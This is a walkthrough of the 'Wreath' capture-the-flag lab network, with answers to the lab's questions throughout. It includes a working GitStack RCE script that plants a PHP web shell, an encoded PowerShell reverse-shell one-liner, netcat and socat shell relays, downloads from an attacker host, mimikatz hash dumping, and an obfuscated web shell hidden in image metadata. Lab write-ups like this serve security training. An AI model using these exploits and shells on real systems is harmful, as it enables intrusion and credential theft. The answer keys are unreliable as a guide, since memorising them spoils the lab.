
# Wreath

## Machine #1

We'll start with nmap scan:

```bash
$ mkdir 10.200.90.200 && sudo nmap 10.200.90.200 -Pn -p- -O -sV -vv --min-parallelism 55 -oN ./10.200.90.200/nmap-scan
```

Select the services and open ports:

```bash
$ cat ./10.200.90.200/nmap-scan | grep -o -e '[0-9]\+/tcp .*'
```

- [ ] 22/tcp    open   ssh        syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
- [ ] 80/tcp    open   http       syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
- [ ] 443/tcp   open   ssl/http   syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
- [ ] 9090/tcp  closed zeus-admin reset ttl 63
- [ ] 10000/tcp open   http       syn-ack ttl 63 MiniServ 1.890 (Webmin httpd)

Let's launch nmap's recon scripts:

```bash
$ sudo nmap 10.200.90.200 -Pn -p 22,80,443,9090,10000 -sV -sC --script discovery,vuln -vv --min-parallelism 55 -oN ./10.200.90.200/nmap-scan-scripts
```

Nothing particularly suspicious was found. But we do know that on the port 10000
runs Webmin 1.890. Search for "Webmin 1.890 CVE" and bam! There's a RCE vulnerability!
Search for CVE-2019-15107 in [ExploitDB](https://www.exploit-db.com/exploits/47293)
or metasploit.

![msf-webmin](https://i.postimg.cc/d14rXp3r/metasploit-shell.png)

Next, fire up [Empire C2](https://github.com/BC-SECURITY/Empire).
I choose run it in a docker container. If you prefer that too, then you'll have to 
replace Dockerfile with this one:

```dockerfile
# NOTE: Only use this when you want to build image locally
#       else use `docker pull bcsecurity/empire:{VERSION}`
#       all image versions can be found at: https://hub.docker.com/r/bcsecurity/empire/

# -----BUILD COMMANDS----
# 1) build command: `docker build -t bcsecurity/empire .`
# 2) create volume storage: `docker create -v /empire --name empire-data bcsecurity/empire`
# 3) run out container: `docker run -it -p 1337:1337 -p 8008:8008 -p 8089:8089 -e "DOTNET_CLI_TELEMETRY_OPTOUT=true" --volumes-from empire-data bcsecurity/empire server`

# -----RELEASE COMMANDS----
# Handled by GitHub Actions

# -----BUILD ENTRY-----

# image base
FROM python:3.9.9-buster

# extra metadata
LABEL maintainer="bc-security"
LABEL description="Dockerfile for Empire server and client. https://bc-security.gitbook.io/empire-wiki/quickstart/installation#docker"

# env setup
ENV STAGING_KEY=RANDOM
ENV DEBIAN_FRONTEND=noninteractive

# set the def shell for ENV
SHELL ["/bin/bash", "-c"]

RUN apt-get update && \
      apt-get -y install \
        sudo \
	    python3-dev && \
	    curl "https://bootstrap.pypa.io/get-pip.py" -o "install-pip3-ubuntu.py" && \
	    python3 install-pip3-ubuntu.py && \
	    apt-get update && \
			apt-get -y install \
				apt-transport-https \
				xclip \
				zip \
    && rm -rf /var/lib/apt/lists/*

RUN curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&\
	chmod +x msfinstall &&\
	./msfinstall

RUN wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb && \
    sudo dpkg -i packages-microsoft-prod.deb && \
    sudo apt-get update && \
    sudo apt-get install -y powershell \
    && rm -rf /var/lib/apt/lists/*

RUN wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb && \
    sudo dpkg -i packages-microsoft-prod.deb && \
    sudo apt-get update && \
    sudo apt-get install -y apt-transport-https dotnet-sdk-3.1 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /empire

COPY pyproject.toml /empire

COPY . /empire

RUN mkdir -p /usr/local/share/powershell/Modules && \
    cp -r ./empire/server/powershell/Invoke-Obfuscation /usr/local/share/powershell/Modules

RUN sudo pip install poetry && sudo poetry config virtualenvs.create false && sudo poetry install

RUN yes | ./ps-empire server --reset
RUN rm -rf /empire/empire/server/data/empire*

ENTRYPOINT ["./ps-empire"]
CMD ["server"]
```

So navigate to the directory where you've cloned Empire and run these commands:

```bash
$ docker build -t bcsecurity/empire .

$ docker create -v /empire --name empire-data bcsecurity/empire

$ docker run -it -p 1337:1337 -p 8008:8008 -p 8089:8089 -e "DOTNET_CLI_TELEMETRY_OPTOUT=true" --volumes-from empire-data bcsecurity/empire server
```

Next, clone the GUI for Empire: [Startkiller](https://github.com/bc-security/starkiller/releases). Download the .AppImage file, make it executable and launch.

In the Starkiller GUI, input server host "https://localhost:1337", credentials: 
empireadmin:password123 (I recommend you to change password ASAP)

Next, create a vanilla http listener:

![http-listener](https://i.postimg.cc/LXV82QqT/listener.png)

Where the host looks like "http://YOUR-IP:8008". After this, generate a python stager:

![stager](https://i.postimg.cc/52WTS4KX/stager.png)

Copy the stager payload and insert it in your metasploit shell:

![stager-copy](https://i.postimg.cc/NFhSCQGC/stager-copy.png)

This is how your Agents page is supposed to look like:

![agents](https://i.postimg.cc/141SFpNt/agents.png)

After this, you can kill the metasploit shell.

---

#### ***Webserver** Enumeration*

- How many of the first 15000 ports are open on the target?

> 4

- What OS does Nmap think is running?

> centos

- Open the IP in your browser: what site does the server try to redirect you to?

> https://thomaswreath.thm

- Read through the text on the page. What is Thomas' mobile phone number?

> +447821548812 

- Let's have a look at the highest open port. Look back at your service scan results: what server version does Nmap detect as running here?

> MiniServ 1.890 (Webmin httpd)

It appears that this service is vulnerable to an unauthenticated remote code execution exploit!

- What is the CVE number for this exploit?

> CVE-2019-15107

---

#### ***Webserver** Exploitation* 

- Which user was the server running as?

> root

- What is the root user's password hash?

Click on the agent. In the "Interact" section input the following command:

```bash
$ cat /etc/shadow | grep -i root
```

![interact](https://i.postimg.cc/dVqmF3WP/interact.png)

> $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.

- What is the full path to this file?

> /root/.ssh/id_rsa

To download the file, click on the "Download" button and input the filename.

Next, in your terminal, do the following:

```bash
$ docker ps -a

# Find there the ID of your Empire server

$ docker exec -it $THE_ID_OF_EMPIRE_SERVER /bin/bash

$ cd /empire/empire/server/downloads/$NAME_OF_THE_AGENT

$ cat id_rsa

# Copy the output and save it to your machine. This is not the proper
# way to copy to transfer the file, but will do for now
```

---

## *Machine #2*

#### ***Pivoting** High-level Overview*

- Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?

> tunneling

- Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?

> portfwd

---

#### ***Pivoting** Enumeration*

- What is the absolute path to the file containing DNS entries on Linux?

> /etc/resolv.conf

- What is the absolute path to the hosts file on Windows?

> C:\Windows\System32\drivers\etc\hosts

- How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?

> for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

---

#### ***Pivoting** Proxychains & Foxyproxy*

- What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?

> socks4 127.0.0.1 4242

- What command would you use to telnet through a proxy to 172.16.0.100:23?

> proxychains telnet 172.16.0.100 23

- You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?

> FP

---

#### ***Pivoting** SSH Tunnelling / Port Forwarding*

- If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

> L

- Which switch combination can be used to background an SSH port forward or tunnel?

> -fN

- It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

> Nay

- What command would you use to create a pair of throwaway SSH keys for a reverse connection?

> ssh-keygen

- If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")

> ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

- What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

> ssh -D 8000 user@target.thm -fN

- If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

> ssh -L 8000:127.0.0.1:80  user@172.16.0.50 -fN

---

#### ***Pivoting** plink.exe*

- What tool can be used to convert OpenSSH keys into PuTTY style keys?

> puttygen

---

#### ***Pivoting** Socat*

- Which socat option allows you to reuse the same listening port for more than one connection?

> reuseaddr

- If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?

Use TCP port 8000 for the server listener, and do not background the process.

> ./socat -tcp-l:8000 tcp:172.16.0.200:443

- What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?

> ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

---

#### ***Pivoting** Chisel*

- What command would you use to start a chisel server for a reverse connection on your attacking machine?

Use port 4242 for the listener and do not background the process.

> ./chisel server -p 4242 --reverse

- What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

> ./chisel client 172.16.0.200:4242 -R:SOCKS &

- How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.

> ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

- If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?

> ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80

---

#### ***Pivoting** sshuttle*

- How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

> sshuttle -r pwned@172.16.20.7 172.16.0.0/16

- What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

> --ssh-cmd "ssh -i priv_key"

- You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.

What switch (and argument) could you use to fix this error?

> -x 172.16.0.100

---

### ***Git Server** Enumeration*

First, download a compiled [nmap](https://github.com/andrew-d/static-binaries).
When you save it, change the name from "nmap" to "nmap-USERNAME"
In the directory where you saved it, start a webserver:

```bash
$ sudo python3 -m http.server 80
```

In your Empire Agent, in the Interact section, type the following command:

```bash
$ curl -o nmap-unknown http://$ATTACKER_IP:80/nmap-unknown && ls -lah && chmod +x nmap-unknown
```

Start the nmap scan:

```bash
$ ./nmap-unknown -sn 10.200.90.1-255 -oN nmap-unknown-results.txt
```

```
# Nmap 6.49BETA1 scan initiated Sat Aug 13 15:40:46 2022 as: ./nmap-unknown -sn -oN nmap-unknown-results.txt 10.200.90.1-255
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-90-1.eu-west-1.compute.internal (10.200.90.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00068s latency).
MAC Address: 02:A7:A9:75:56:EB (Unknown)
Nmap scan report for ip-10-200-90-100.eu-west-1.compute.internal (10.200.90.100)
Host is up (0.00052s latency).
MAC Address: 02:7F:D8:04:10:D9 (Unknown)
Nmap scan report for ip-10-200-90-150.eu-west-1.compute.internal (10.200.90.150)
Host is up (-0.10s latency).
MAC Address: 02:55:C4:9C:86:39 (Unknown)
Nmap scan report for ip-10-200-90-250.eu-west-1.compute.internal (10.200.90.250)
Host is up (0.00070s latency).
MAC Address: 02:5C:30:38:02:5F (Unknown)
Nmap scan report for ip-10-200-90-200.eu-west-1.compute.internal (10.200.90.200)
Host is up.
# Nmap done at Sat Aug 13 15:40:50 2022 -- 255 IP addresses (5 hosts up) scanned in 3.73 seconds
```

2 hosts are out of scope: the one ending with 1 and the other one: with 250.
The ip that ends with 200 is our current host.

- Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?

> 2

- In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)

> 100,150

- Scan the hosts: which one does not return a status of "filtered" for every port (submit the last octet only)?

In Interactive:

```bash
$ echo '10.200.90.100' >> targets-unknown.txt

$ echo '10.200.90.150' >> targets-unknown.txt

$ ./nmap-unknown -iL targets-unknown.txt -Pn -p- -vv -oN nmap-unknown-ports-result.txt
```

Note: Empire might think that agent has died, because this scan takes up a lot of time, 
so consider either changing the "lost limit" or go with a faster scan. Expoiting the
webmin vulnerability again and using metasploit shell is also an option. If
you're using metasploit, the shell can be upgraded with python:

```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

> 150

- Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?

> 80,3389,5985

- Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?

> http

---

### ***Git Server** Pivoting*

We'll use chisel for pivoting through the network. First, download [Chisel linux amd 64](https://github.com/jpillora/chisel/releases)

```bash
$ mv ~/Downloads/chisel_1.7.7_linux_amd64.gz .

$ gzip -d chisel_1.7.7_linux_amd64.gz

$ mv chisel_1.7.7_linux_amd64 chisel
```

Start http server:

```bash
$ sudo python3 -m http.server 80
```

In the Empire Agent:

```bash
$ curl http://$ATTACKER_IP:80/chisel -o chisel-unknown && ls -lah && chmod +x chisel-unknown
```

Next, on the attacker machine (I cloned the chisel repo):

```bash
$ go run main.go server -p 8000 --reverse
```

Spawn another Empire Agent, run the following command and kill stale agents:

```bash
$ ./chisel-unknown client $ATTACKER_IP:8000 R:10001:10.200.90.150:80 &
```

Documentation for killing stale Empire agents is available [here](https://bc-security.gitbook.io/empire-wiki/restful-api/admin-functionality)

If everything went fine, in the terminal that has chisel server running, the following
line should have appeared:

```
$DATE server: session#1: tun: proxy#R:10001=>10.200.90.150:80: Listening
```

Navigate to "http://localhost:10001/". You should see this page:

![forwarded-service](https://i.postimg.cc/15hG9WQ3/forwarded-service.png)

-  What is the name of the program running the service?

> gitstack

- Do these default credentials work (Aye/Nay)?

> Nay

- Use the command: searchsploit SERVICENAME, on Kali to search for exploits related to this service.

You will see that there are three publicly available exploits.
There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?

If you're not using Kali, go to ExploitDB and search for gitstack

> 43777

---

### ***Git Server** Code Review*

- Look at the information at the top of the script. On what date was this exploit written?

> 18.01.2018

- Is the script written in Python2 or Python3?

> Python2

- Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit? 

> csrftoken

---

### ***Git Server** Exploitation*

We'll use a slightly modified exploit. Save it to "exploit.py" file.

```python
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = 'localhost:10001'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print("[+] Get user list")
try:
	r = requests.get("http://{}/rest/user/".format(ip))
	user_list = r.json()
	user_list.remove('everyone')
except:
	pass

if len(user_list) > 0:
	username = user_list[0]
	print( "[+] Found user {}".format(username))
else:
	r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
	print("[+] Create user")
	
	if not "User created" in r.text and not "User already exist" in r.text:
		print("[-] Cannot create user")
		os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
	print("[+] Web repository already enabled")
else:
	print("[+] Enable web repository")
	r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
	if not "Web interface successfully enabled" in r.text:
		print("[-] Cannot enable web interface")
		os._exit(0)

print("[+] Get repositories list")
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
	repository = repository_list[0]['name']
	print("[+] Found repository {}".format(repository))
else:
	print("[+] Create repository")

	r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
	if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
		print("[-] Cannot create repository")
		os._exit(0)

print("[+] Add user to repository")
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
	print("[-] Cannot add user to repository")
	os._exit(0)	

print("[+] Disable access for anyone")
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
	print("[-] Cannot remove access for anyone")
	os._exit(0)	

print("[+] Create backdoor in PHP")
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-unknown.php'))
print(r.text.encode(sys.stdout.encoding, errors='replace'))

print("[+] Execute command")
r = requests.post("http://{}/web/exploit-unknown.php".format(ip), data={'a' : command})
print(r.text.encode(sys.stdout.encoding, errors='replace'))
```

Exploit the target:

```bash
$ python3 exploit.py
```

First up, let's use some basic enumeration to get to grips with the webshell:

- What is the hostname for this target?

```bash
$ curl -X POST http://localhost:10001/web/exploit-unknown.php -d "a=hostname"
```

> git-serv

- What operating system is this target?

> windows

- What user is the server running as?

```bash
$ curl -X POST http://localhost:10001/web/exploit-unknown.php -d "a=whoami"
```

> nt authority\system

Try to ping yourself from the .150 machine. How many packets make it to the waiting 
listener? 

> 0

Ok, in the Empire Agent, run following commands:

```bash
$ firewall-cmd --zone=public --add-port 15182/tcp

$ firewall-cmd --zone=public --add-port 15183/tcp
```

You should see it return "success" in both cases. Next, download [socat for linux](https://sourceforge.net/projects/unix-utils/files/socat/) and upload it to the .200 machine.

Attacker machine:

```bash
$ sudo python3 -m http.server 80
```

Empire Agent:

```bash
$ curl http://10.50.91.83:80/socat -o socat-unknown && chmod +x socat-unknown
```

On attacker machine:

```bash
$ sudo nc -lvnp 443
```

Next, in a separate Empire Agent create a Socat Reverse Shell Relay:

```bash
$ ./socat-unknown tcp-l:15182 tcp:$ATTACKER_IP:443 &
```

After this, on your attacking machine, send a reverse-shell-oneliner to vulnerable
git service:

```bash
$ curl -X POST http://localhost:10001/web/exploit-unknown.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.90.200%27%2C15182%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

Checkout the terminal with a listener on port 443: you should have a reverse shell
there now!

---

### ***Git Server** Stabilisation & Post Exploitation*

Create a new user:

```ps
> net user unknown unknown /add
```

Add the user to local administrators & "Remote Management Users" groups:

```ps
> net localgroup Administrators unknown /add

> net localgroup "Remote Management Users" unknown /add
```

Setup 2nd tunnel to connect to win-rm. On the compromised machine:

```bash
$ ./chisel-unknown client $ATTACKER_IP:8000 R:5985:10.200.90.150:5985 &
```

Use evil-winrm:

```bash
$ evil-winrm -u unknown -p unknown -i localhost
```

You'll need mimkatz to dump the hashes. You can download a [compiled mimikatz here](https://github.com/gentilkiwi/mimikatz/releases)
Your browser will warn you that the website contains harmful software. Skip the warning
and proceed with downloading. Move the archive to new directory, called mimikatz.
In that directory:

```bash
$ unzip mimikatz_trunk.zip

$ cd x64

$ sudo python3 -m http.server 80
```

Now, on the .200 machine:

```bash
$ curl http://$ATTZACKER_IP:80/mimikatz.exe -o mimikatz-unknown.exe

$ python3 -m http.server 15183
```

And finally, in EvilWinRM shell:

```ps
> cd ../Downloads

> certutil.exe -urlcache -f http://10.200.90.200:15183/mimikatz-unknown.exe mimikatz-unknown.exe
```

Setup RDP tunnel as well: on the .200 machine run:

```bash
$ ./chisel-unknown client $ATTACKER_IP:8000 R:3389:10.200.90.150:3389 &
```

Connect to rdp from an attacker machine (It's so fucking slow...):

```bash
$ xfreerdp /v:localhost /u:unknown /p:unknown
```

Once you're connected, run cmd as administrator. Navigate to your Downloads folder
and launch mimikatz

- What is the Administrator password hash?

In mimikatz, use these commands:

```cmd
mimikatz # privilege::debug
# Supposed to return "Privilege '20' OK"

mimikatz # token::elevate

mimikatz # lsadump::sam
```

> 37db630168e5f82aafa8461e05c6bbd1

- What is the NTLM password hash for the user "Thomas"?

> 02d90eda8f6b6b06c32d5f207831101f

- What is Thomas' password?

Navigate to [Crackstation](https://crackstation.net/) and lookup the hash

> i<3ruby

Gain evil-winrm shell as Administrator:

```bash
$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i localhost
```

---

### ***Command and Control** Empire: Overview*

- Can we get an agent back from the git server directly (Aye/Nay)?

> Nay

---

### ***Command and Control** Empire: Agents*

- Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?

> shell whoami

---

### ***Command and Control** Git Server*

First, generate the hop listener:

![hop-listener](https://i.postimg.cc/SR8KmHrn/hop-listener.png)

This listener will be served on the previously compromised machine (*.200) and behave 
as a reverse shell relay: traffic to/from this listener will be forwarded to/from
an actual http listener

Next, the stager for git server:

![git-stager](https://i.postimg.cc/0535b5Mh/git-stager.png)

Find out what is the id of empire server docker container:

```bash
$ docker ps -a
```

Get an interactive shell in it:

```bash
$ docker exec -it $CONTAINER_ID_GOES_HERE /bin/bash
```

The files are under ***/tmp/http_hop/***:

```bash
$ cd /tmp/http_hop/

$ zip -r hop.zip *
```

Exit the docker container shell. In your attacker machine, type in the following command
to transfer the archive from container to current folder:

```bash
$ docker cp $CONTAINER_ID_GOES_HERE:/tmp/http_hop/hop.zip .
```

In attacker machine start http server:

```bash
$ sudo python3 -m http.server 80
```

On the public-facing compromised host:

```bash
$ cd /tmp

$ mkdir hop-unknown

$ cd hop-unknown

$ curl http://10.50.91.83:80/hop.zip -o hop.zip

$ unzip hop.zip
```

Start the php web server on a compromised host using the port, selected in
http_hop listener configuration:

```bash
$ php -S 0.0.0.0:15183 &>/dev/null &
```

Make sure the server is indeed running:

```bash
$ ss -tulwn | grep 15183
```

Now navigate to stagers and copy the stager for gitserver. Insert it into evilwinrm 
shell, that runs as administrator. After you're done, you should have an Agent,
connected to git-server!

![git-agent](https://i.postimg.cc/XJWZpjrw/git-agent.png)

---

### ***Command and Control** Empire: Modules*

Sherlock module example:

![sherlock-module-example](https://i.postimg.cc/Sxpp0J37/git-agent-module-example.png)

---

## *Machine #3*

### ***Personal PC** Enumeration*

Just for fun I'm gonna use Empire module called
powershell/situational_awareness/network/portscan. Configure it:

- Hosts: 10.200.90.100
- TopPorts: 50
- ReadableOut: res.nmap
- SkipDiscovery: True

then hit "Submit". We're skipping discovery, because it is done via ICMP scans
which are blocked by the other Windows host.

We got 2 ports:

```
Hostname      OpenPorts
--------      ---------
10.200.90.100 80,3389
```

- Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?

> 80,3389

---

### ***Personal PC** Pivoting*

- [x] On your attacking machine:

```bash
$ go run main.go server -p 8001 --reverse
```

- [x] On 1st compromised machine:

Upload chisel-unknown.exe file. From there, transfer it to 2nd compromised machine:
Spin up python http server: `python3 -m http.server 15180`,
in the Empire shell type:

```cmd
> netsh advfirewall firewall add rule name="unknown-15180" dir=in action=allow protocol=tcp localport=15180

> certutil.exe -urlcache -f http://10.200.90.200:15180/chisel-unknown.exe chisel-unknown.exe
```

Back to the 1st machine:

```bash
$ firewall-cmd --zone=public --add-port 15180/tcp

$ firewall-cmd --zone=public --add-port 15181/tcp

$ ./chisel-unknown server -p 15181 --reverse &

$ ./chisel-unknown client $ATTACKER_IP:8001 R:10003:localhost:15180 &
```

- [x] On 3rd compromised machine:

```cmd
> .\chisel-unknown.exe client 10.200.90.200:15181 R:15180:10.200.90.100:80
```

Now visit it in your browser at "http://10.50.91.83:10003/"

- Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.

Pasting any kind of url to Wappalyzer didn't work for me, so I couldn't find out the 
underlying technology that way. However, if you send a malformed request to backend,
most likely, it'll spit an error that reveals this information. In browser,
navigate to "http://10.50.91.83:10003/%00" and you'll see what has Thomas used.

> PHP 7.4.11

---

### ***Personal PC** The Wonders of Git*

- Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?

> C:\GitStack\repositories\Website.git

Use git-dumper to download the entrire git folder:

```bash
$ git-dumper http://localhost:10003/ ./git

$ cd git
```

---

### ***Personal PC** Website Code Analysis*

Awesome. We dumped git repository. Lets look around. List commits:

```bash
$ git log
```

The backend stuff looks interesting:

```bash
$ git checkout 82dfc97bec0d7582d485d9031c09abcb5c6b18f2

$ tree

$ cat ./resources/index.php
```

- What does Thomas have to phone Mrs Walker about?

> neighbourhood watch meetings

- Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?

> basic auth

- Which extensions are accepted (comma separated, no spaces or quotes)?

> jpeg,jpg,png,gif

---

### ***Personal PC** Exploit PoC*

Save those usernames and passwords to files and run:

```bash
$ hydra -L usernames.txt -P passwords.txt localhost -s 10003 http-get /resources -V -I
```

Credentials:

> Thomas:i<3ruby 

The file will be under http://localhost:10003/resources/uploads/$THE-EXACT-FILE-NAME

I took a file called leaves.jpg and inserted a malicious payload in the metadata 
Comment:

```bash
$ exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" leaves.jpg.php
```

---

### ***AV Evasion** Introduction*

- Which category of evasion covers uploading a file to the storage on the target before executing it?

> on-disk evasion

- What does AMSI stand for?

> antimalware scan interface

- Which category of evasion does AMSI affect?

> in-memory evasion

---

### ***AV Evasion** AV Detection Methods*

- What other name can be used for Dynamic/Heuristic detection methods?

> behavioural

- If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?

> static

- When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?

> pre-defined rules 

- What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?

> password

---

### ***AV Evasion** PHP Payload Obfuscation*

Obfuscate this payload:

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

With [PHP Obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

![php-obfuscator](https://i.postimg.cc/d3FqYFsD/php-obfuscator.png)

Our payload looks like:

```php
<?php \$t0=\$_GET[base64_decode('dW5rbm93bg==')];if(isset(\$t0)){echo base64_decode('PHByZT4=').shell_exec(\$t0).base64_decode('PC9wcmU+');}die();?>
```

Set payload:

```
$ exiftool -Comment="<?php \$t0=\$_GET[base64_decode('dW5rbm93bg==')];if(isset(\$t0)){echo base64_decode('PHByZT4=').shell_exec(\$t0).base64_decode('PC9wcmU+');}die();?>" matrix.jpg.php -overwrite_original
```

Exploit it by naviagating to http://localhost:10003/resources/uploads/matrix.jpg.php?unknown=whoami

- What is the Host Name of the target?

Visit http://localhost:10003/resources/uploads/matrix.jpg.php?unknown=hostname

> wreath-pc

- What is our current username (include the domain in this)?

Visit http://localhost:10003/resources/uploads/matrix.jpg.php?unknown=whoami

> wreath-pc\thomas

---

### ***AV Evasion** Compiling Netcat & Reverse Shell!*

Clone the nc.exe from github.

- What output do you get when running the command: certutil.exe?

Visit http://localhost:10003/resources/uploads/matrix.jpg.php?unknown=certutil.exe

> CertUtil: -dump command completed successfully.

Use cURL to upload your new copy of netcat to the target

Attacker mchine:

```bash
$ cd nc.exe

$ sudo python3 -m http.server 80
```

Visit localhost:10003/resources/uploads/matrix.jpg.php?unknown=curl http://$ATTACKER_IP:80/nc64.exe -o nc-unknown.exe

Next, on attacker machine:

```bash
$ nc -lnvp 443
```

In browser visit http://localhost:10003/resources/uploads/matrix.jpg.php?unknown=nc-unknown.exe%20$ATTACKER_IP%20443%20-e%20cmd.exe

---

### ***AV Evasion** Introduction*

Use the command `whoami /priv`.

- [Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits: which privilege is this?

> SeImpersonatePrivilege

- Let's start by looking for non-default services:
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

There should be a bunch of results returned here. Read through them, paying particular attention to the PathName  column. Notice that one of the paths does not have quotation marks around it.

What is the Name (second column from the left) of this service?

> SystemExplorerHelpService

- Is the service running as the local system account (Aye/Nay)?

```cmd
> sc qc SystemExplorerHelpService
```

> Aye

---

### ***AV Evasion** Privilege Escalation*

Exploit the Unquoted Service path vulnerability!

---

### ***Exfiltration** Exfiltration Techniques & Post Exploitation*

- Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?

> Nay

- For what reason is HTTPS preferred over HTTP during exfiltration?

> encryption

- What is the Administrator NT hash for this target?

> a05c3c807ceeb48c47252568da284cd2

---

